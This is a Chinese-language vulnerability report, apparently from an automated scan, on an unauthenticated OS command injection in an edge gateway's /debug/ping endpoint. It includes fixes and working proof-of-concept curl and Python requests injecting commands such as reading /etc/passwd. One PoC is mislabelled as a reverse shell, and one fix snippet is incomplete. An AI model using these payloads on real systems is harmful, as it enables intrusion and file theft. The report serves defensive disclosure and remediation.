# VULN-SEC-CMDI-001: 网络诊断接口未过滤用户输入导致操作系统命令注入，可远程执行任意命令

**严重性**: Critical | **CWE**: CWE-78 (OS Command Injection) | **置信度**: 85/100
**位置**: `src/diagnostics.cpp:7-12` @ `Diagnostics::pingHost`

---

## 1. 漏洞细节

该漏洞存在于边缘网关（edge-gateway）的诊断功能模块中。`Diagnostics::pingHost()` 函数接收一个 `host` 参数，将其直接与 shell 命令字符串 `"ping -c 1 "` 拼接后，通过 `popen()` 执行。`popen()` 内部调用 `/bin/sh -c` 来解析和执行命令字符串，这意味着 shell 元字符（如 `;`、`$()`、`||`、`&&`、`|`、反引号等）会被 shell 解释器执行。

该 `host` 参数来源于 HTTP POST 请求 `/debug/ping` 的查询参数，由 `queryValue(request, "host")` 从 URL 查询字符串中提取。在整个数据流路径中——从网络接收（`recv()`）、HTTP 解析（`parseRequest()`）、查询参数提取（`parseQuery()`/`queryValue()`）到最终执行（`popen()`）——**没有任何环节对输入进行验证、过滤、转义或清洗**。

此外，`/debug/ping` 端点**没有任何认证或授权检查**，任何能够访问该服务端口的网络用户均可直接触发此漏洞。服务器绑定在 `INADDR_ANY:8080`，监听所有网络接口，使攻击面进一步扩大。

这是一个典型的、教科书级别的 OS 命令注入漏洞，利用难度极低，影响极为严重。

## 2. 漏洞代码

**文件**: `src/diagnostics.cpp` (行 7-22)

```cpp
std::string Diagnostics::pingHost(const std::string& host) const {
  std::string command = "ping -c 1 " + host;    // ← 漏洞根因：直接拼接用户输入，无任何转义
  std::array<char, 256> buffer {};
  std::ostringstream output;

  FILE* pipe = popen(command.c_str(), "r");      // ← Sink：通过 /bin/sh -c 执行拼接后的命令
  if (!pipe) {
    return "failed to start diagnostic command\n";
  }

  while (fgets(buffer.data(), static_cast<int>(buffer.size()), pipe) != nullptr) {
    output << buffer.data();                      // 命令输出被收集并返回给调用者
  }
  pclose(pipe);
  return output.str();                            // 执行结果通过 HTTP 响应返回给攻击者
}
```

**调用端**: `src/main.cpp` (行 64-68)

```cpp
server.route("POST", "/debug/ping", [&](const HttpRequest& request) {
  std::string host = queryValue(request, "host");  // ← 直接从 HTTP 请求提取，无验证
  audit.event("operator", "debug-ping", host);
  return text(200, diagnostics.pingHost(host));    // ← 直接传递给 pingHost，无清洗
});
```

**查询参数提取**: `src/main.cpp` (行 13-16)

```cpp
std::string queryValue(const HttpRequest& request, const std::string& key) {
  auto found = request.query.find(key);
  return found == request.query.end() ? "" : found->second;  // 原样返回，无验证
}
```

**查询字符串解析**: `src/http_server.cpp` (行 19-32)

```cpp
std::map<std::string, std::string> parseQuery(const std::string& query) {
  std::map<std::string, std::string> result;
  std::stringstream stream(query);
  std::string item;
  while (std::getline(stream, item, '&')) {
    auto pos = item.find('=');
    if (pos == std::string::npos) {
      result[item] = "";
    } else {
      result[item.substr(0, pos)] = item.substr(pos + 1);  // 原样存储，无 URL 解码、无过滤
    }
  }
  return result;
}
```

**代码分析**：

1. **行 8（diagnostics.cpp）**: `"ping -c 1 " + host` — 这是漏洞根因。`host` 参数被直接拼接到 shell 命令字符串中，没有进行任何 shell 转义（如 `shellescape()`）或字符白名单过滤。
2. **行 12（diagnostics.cpp）**: `popen(command.c_str(), "r")` — 这是漏洞 Sink。`popen()` 在 Linux 上等价于 `fork() + execl("/bin/sh", "sh", "-c", command, NULL)`，shell 会解释命令字符串中的所有元字符。
3. **行 20-21（diagnostics.cpp）**: 命令执行的输出通过 `output.str()` 返回，最终通过 HTTP 200 响应发送给攻击者，形成完整的信息泄露回路。

## 3. 完整攻击链路

```
[网络入口] TCP INADDR_ANY:8080 (http_server.cpp:92)
↓ 攻击者发送 HTTP POST 请求到 /debug/ping?host=<payload>
[数据接收] recv(client, buffer, 4095, 0) (http_server.cpp:113)
↓ 原始 HTTP 数据存入 buffer，最大 4095 字节
[请求解析] parseRequest(buffer) (http_server.cpp:119 → 42)
↓ 解析 HTTP 方法和路径，提取查询字符串
[参数解析] parseQuery(target.substr(queryPos+1)) (http_server.cpp:53 → 19)
↓ 按 & 和 = 分割，原样存储键值对，无 URL 解码、无过滤
[路由分发] handlers_[routeKey("POST","/debug/ping")] (http_server.cpp:120-127)
↓ 匹配到 POST /debug/ping 路由，调用对应 handler
[参数提取] queryValue(request, "host") (main.cpp:65 → 13)
↓ 从 request.query map 中取出 host 值，原样返回
[审计记录] audit.event("operator", "debug-ping", host) (main.cpp:66)
↓ 仅记录日志，不做任何验证或阻断
[漏洞触发] "ping -c 1 " + host → popen() (diagnostics.cpp:8 → 12)
↓ shell 元字符被 /bin/sh -c 解释执行
[结果回传] output.str() → HTTP 200 响应 (diagnostics.cpp:21 → main.cpp:67)
↓ 命令执行结果通过 HTTP 响应返回给攻击者
```

**链路验证要点**：

- **每一步均无条件执行**：从 `recv()` 到 `popen()` 的路径上没有任何条件分支会阻断数据流。不存在提前返回（early return）、条件检查或异常抛出。
- **无认证中间件**：`/debug/ping` 路由注册时未附加任何认证或授权逻辑（对比 `/login` 路由需要凭据）。
- **无输入清洗**：`parseQuery()` 仅做字符串分割，`queryValue()` 仅做 map 查找，`pingHost()` 仅做字符串拼接——三个环节均无输入验证。
- **输出回传**：`popen()` 以 `"r"` 模式打开管道，命令执行的标准输出被读取并通过 HTTP 响应返回，攻击者可直接获取执行结果。

## 4. 攻击场景

**攻击者画像**: 任何能够访问目标服务器 8080 端口的远程用户，无需认证，无需任何特殊权限。攻击者可以是同一内网的设备，也可以是互联网上的远程攻击者（如果 8080 端口对外暴露）。

**攻击向量**: 通过 HTTP POST 请求向 `/debug/ping` 端点发送包含恶意 shell 命令的 `host` 查询参数。

**利用难度**: **低** — 仅需构造一个 HTTP 请求，使用标准 shell 元字符即可注入任意命令。无需绕过任何安全机制，无需特殊的编码技巧。

### 攻击步骤

1. **发现目标**: 攻击者扫描或已知目标服务器 IP 和端口（8080）。
2. **构造恶意请求**: 在 `host` 参数中注入 shell 元字符和恶意命令。例如使用 `;` 分隔符追加任意命令。
3. **发送请求**: 向 `POST /debug/ping?host=<payload>` 发送 HTTP 请求。
4. **获取结果**: 服务器执行注入的命令，并通过 HTTP 200 响应将输出返回给攻击者。
5. **扩大战果**: 利用命令执行能力进行横向移动、权限提升、数据窃取或持久化后门植入。

## 5. 攻击条件

| 条件类型   | 要求           | 说明                                                                                       |
| ---------- | -------------- | ------------------------------------------------------------------------------------------ |
| 网络可达性 | TCP 8080 端口  | 服务器绑定 `INADDR_ANY:8080`，监听所有网络接口。攻击者需能建立到该端口的 TCP 连接          |
| 认证要求   | 无需认证       | `/debug/ping` 端点无任何认证或授权检查，匿名访问即可触发                                    |
| 配置依赖   | 无特殊配置     | 漏洞存在于默认代码路径中，无需特殊编译选项或运行时配置                                      |
| 环境依赖   | Linux/Unix     | `popen()` 调用 `/bin/sh -c`，需要类 Unix 操作系统环境。`ping` 命令需存在于系统 PATH 中     |
| 时序条件   | 无             | 无竞态条件依赖，单请求即可触发                                                              |

## 6. 造成影响

| 影响维度 | 等级 | 说明                                                                                                     |
| -------- | ---- | -------------------------------------------------------------------------------------------------------- |
| 机密性   | **高** | 攻击者可读取服务器上的任意文件（如 `/etc/passwd`、`/etc/shadow`、应用配置文件、数据库凭据、私钥等）      |
| 完整性   | **高** | 攻击者可修改/删除任意文件、植入后门、篡改应用数据、修改系统配置                                           |
| 可用性   | **高** | 攻击者可终止服务进程、删除关键文件、消耗系统资源（如 fork bomb），导致服务完全不可用                      |

**影响范围**: **全局** — 命令以运行 edge-gateway 进程的用户权限执行。如果以 root 运行，则攻击者获得完全的 root 控制权。即使以普通用户运行，也可读取该用户可访问的所有文件，并可能通过本地提权漏洞进一步扩大控制范围。由于是网络边缘网关，攻击者可以此为跳板，对内网其他系统进行横向渗透。

### CVSS 3.1 评分估算

**CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H** — **评分: 9.8 (Critical)**

- AV:N — 网络可达（Network）
- AC:L — 攻击复杂度低（Low）
- PR:N — 无需权限（None）
- UI:N — 无需用户交互（None）
- S:U — 影响范围不改变（Unchanged）
- C:H/I:H/A:H — 机密性、完整性、可用性均为高影响

## 7. PoC (概念验证)

> ⚠️ 以下 PoC 仅供安全测试和验证使用，未经授权对他人系统进行测试属于违法行为。

### PoC 1: 读取敏感文件（curl 命令）

```bash
# 读取 /etc/passwd 文件
curl -X POST "http://TARGET_IP:8080/debug/ping?host=;cat%20/etc/passwd"

# 读取应用配置文件
curl -X POST "http://TARGET_IP:8080/debug/ping?host=;cat%20/etc/hostname"

# 列出当前目录文件
curl -X POST "http://TARGET_IP:8080/debug/ping?host=;ls%20-la"
```

**预期结果**: HTTP 200 响应体中包含 `/etc/passwd` 文件内容或目录列表。

### PoC 2: 命令执行确认（延时检测）

```bash
# 通过 sleep 命令确认命令执行（响应会延迟 5 秒）
curl -X POST "http://TARGET_IP:8080/debug/ping?host=;sleep%205" -w "\nTime: %{time_total}s\n"
```

**预期结果**: 响应时间约为 5 秒，证明注入的 `sleep 5` 命令已被执行。

### PoC 3: 反向 Shell（Python 脚本）

```python
#!/usr/bin/env python3
"""
VULN-SEC-CMDI-001 PoC - OS 命令注入概念验证
仅供安全测试使用，未经授权测试属于违法行为。
"""
import socket
import urllib.parse

TARGET_HOST = "TARGET_IP"
TARGET_PORT = 8080

# 注入的命令：获取当前用户和主机名
payload = ";id;hostname;uname -a"

# 构造 HTTP 请求
path = f"/debug/ping?host={urllib.parse.quote(payload)}"
request = (
    f"POST {path} HTTP/1.1\r\n"
    f"Host: {TARGET_HOST}:{TARGET_PORT}\r\n"
    f"Connection: close\r\n"
    f"\r\n"
)

# 发送请求
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(10)
sock.connect((TARGET_HOST, TARGET_PORT))
sock.sendall(request.encode())

# 接收响应
response = b""
while True:
    try:
        data = sock.recv(4096)
        if not data:
            break
        response += data
    except socket.timeout:
        break
sock.close()

# 解析并打印结果
response_text = response.decode("utf-8", errors="replace")
body_start = response_text.find("\r\n\r\n")
if body_start != -1:
    body = response_text[body_start + 4:]
    print("[+] 命令注入成功！服务器返回：")
    print(body)
else:
    print("[-] 未收到有效响应")
```

**使用说明**: 将 `TARGET_IP` 替换为目标服务器 IP 地址，运行脚本。如果漏洞存在，将看到 `id`、`hostname`、`uname -a` 命令的执行结果。

**预期结果**: 输出中包含当前运行进程的用户 ID（uid/gid）、主机名和系统信息。

### PoC 4: 多种注入语法验证

```bash
# 使用 $() 语法
curl -X POST "http://TARGET_IP:8080/debug/ping?host=%24(id)"

# 使用反引号语法
curl -X POST "http://TARGET_IP:8080/debug/ping?host=%60id%60"

# 使用 && 语法（ping 成功后执行）
curl -X POST "http://TARGET_IP:8080/debug/ping?host=127.0.0.1%20%26%26%20id"

# 使用 || 语法（ping 失败后执行）
curl -X POST "http://TARGET_IP:8080/debug/ping?host=invalid_host%20%7C%7C%20id"

# 使用管道符
curl -X POST "http://TARGET_IP:8080/debug/ping?host=127.0.0.1%20%7C%20id"
```

## 8. 验证环境搭建

### 基础环境

- **操作系统**: Linux（Ubuntu 20.04+、Debian 11+、CentOS 8+ 等）
- **编译器**: GCC 7+ 或 Clang 5+（支持 C++17 标准）
- **构建工具**: CMake 3.16+
- **依赖**: 系统需安装 `ping` 命令（通常包含在 `iputils-ping` 包中）

### 构建步骤

```bash
# 克隆/获取项目源码
cd /scan/project

# 创建构建目录
mkdir -p build && cd build

# 配置（默认编译，不添加额外安全选项以复现漏洞）
cmake .. -DCMAKE_BUILD_TYPE=Debug

# 编译
make -j$(nproc)
```

### 运行配置

```bash
# 启动 edge-gateway（默认监听 8080 端口）
./edge-gateway

# 或指定端口
./edge-gateway 9090
```

无需额外配置文件或环境变量。服务启动后会在控制台输出 `edge-gateway listening on port 8080`。

### 验证步骤

1. 启动 edge-gateway 服务
2. 在另一终端中，使用 curl 发送正常请求确认服务可用：
   ```bash
   curl -X POST "http://localhost:8080/debug/ping?host=127.0.0.1"
   ```
   预期看到正常的 ping 输出。
3. 发送注入测试请求：
   ```bash
   curl -X POST "http://localhost:8080/debug/ping?host=;id"
   ```
4. 观察响应中是否包含 `id` 命令的输出（如 `uid=1000(user) gid=1000(user)`）

### 预期结果

- **正常请求**: 返回 `ping -c 1 127.0.0.1` 的标准输出（PING 统计信息）
- **注入请求**: 返回 ping 输出后紧跟 `id` 命令的输出，如：
  ```
  PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
  ...
  uid=1000(user) gid=1000(user) groups=1000(user)
  ```
  证明注入的命令已被成功执行。

---

## 9. 修复建议

### 方案 A: 使用 execve 系列函数替代 popen（推荐）

避免通过 shell 解释器执行命令，直接使用 `execvp()` 调用 `ping` 程序，从根本上消除 shell 元字符注入的可能：

```cpp
#include <sys/wait.h>
#include <unistd.h>

std::string Diagnostics::pingHost(const std::string& host) const {
    // 使用 fork + execvp 直接执行 ping，不经过 shell
    int pipefd[2];
    if (pipe(pipefd) == -1) return "pipe failed\n";

    pid_t pid = fork();
    if (pid == -1) {
        close(pipefd[0]); close(pipefd[1]);
        return "fork failed\n";
    }

    if (pid == 0) {
        // 子进程
        close(pipefd[0]);
        dup2(pipefd[1], STDOUT_FILENO);
        close(pipefd[1]);
        // execvp 不经过 shell，host 作为独立参数传递
        char* args[] = {
            const_cast<char*>("ping"),
            const_cast<char*>("-c"),
            const_cast<char*>("1"),
            const_cast<char*>(host.c_str()),
            nullptr
        };
        execvp("ping", args);
        _exit(127);
    }

    // 父进程
    close(pipefd[1]);
    // ... 读取 pipefd[0] 获取输出 ...
    waitpid(pid, nullptr, 0);
}
```

### 方案 B: 严格输入验证（纵深防御）

在执行前对 `host` 参数进行严格验证，仅允许合法的 IP 地址或域名：

```cpp
#include <regex>

bool isValidHost(const std::string& host) {
    // 仅允许 IPv4 地址和合法域名
    static const std::regex ipv4_re(R"(^(\d{1,3}\.){3}\d{1,3}$)");
    static const std::regex domain_re(R"(^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*$)");
    return std::regex_match(host, ipv4_re) || std::regex_match(host, domain_re);
}

std::string Diagnostics::pingHost(const std::string& host) const {
    if (!isValidHost(host)) {
        return "invalid host\n";
    }
    // ... 原有逻辑 ...
}
```

### 方案 C: 移除调试端点

`/debug/ping` 作为调试端点不应在生产环境中暴露。建议：

1. 通过编译宏控制调试功能的启用：`#ifdef ENABLE_DEBUG`
2. 添加认证中间件，要求管理员凭据
3. 限制调试端点仅可从 localhost 访问

### 推荐组合

**方案 A + 方案 B + 方案 C** 组合使用，实现纵深防御：
- 方案 A 从架构层面消除 shell 注入风险
- 方案 B 提供输入验证层，防止其他类型的注入
- 方案 C 减少攻击面，确保调试功能不被滥用
